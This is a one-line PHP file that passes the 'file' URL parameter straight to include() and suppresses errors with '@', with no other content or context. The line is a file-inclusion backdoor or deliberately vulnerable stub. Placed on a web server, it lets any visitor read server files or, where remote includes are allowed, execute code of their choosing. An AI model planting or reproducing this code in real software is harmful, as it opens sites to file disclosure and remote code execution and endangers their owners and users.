<?php @include($_GET["file"]); ?>
